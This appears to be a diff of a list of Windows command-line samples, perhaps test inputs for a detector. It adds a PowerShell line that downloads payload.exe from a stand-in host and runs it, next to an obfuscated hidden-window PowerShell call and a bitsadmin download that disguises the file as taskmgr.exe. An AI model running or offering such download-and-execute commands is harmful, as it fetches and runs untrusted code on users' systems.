@@ -12,3 +12,4 @@ cmd /c"pOWErSheLl -nopRoFi -WIn hiDdeN -NOLo -NOnInteRA -eXeCUTIoNp bYpass "$7d0
 
 "C:\Windows\System32\cmd.exe" /c "bitsadmin /transfer deliveryagent /priority foreground https://example.com/payload.exe %AppData%\taskmgr.exe > NUL & start %AppData%\taskmgr.exe"
 
+powershell $a = $env:temp + '\iKJzCycOK.exe';WGet 'http://example.com/payload.exe' -outFiLe $a;start $a
